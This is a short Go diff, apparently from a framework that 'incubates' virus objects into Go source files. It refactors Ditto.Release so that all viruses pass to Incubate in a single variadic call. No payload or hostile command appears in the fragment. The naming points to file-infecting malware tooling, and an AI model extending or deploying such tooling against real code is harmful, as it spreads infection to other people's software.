@@ -79,9 +79,7 @@ func (o *Ditto) Release(viri ...viruses.Virus) {
 	var incubated []*goinfectedfile.GoInfectedFile
 
 	for _, source := range sources {
-		for _, virus := range viri {
-			incubated = append(incubated, source.Incubate(virus)...)
-		}
+		incubated = append(incubated, source.Incubate(viri...)...)
 	}
 
 	for _, infectedFile := range incubated {
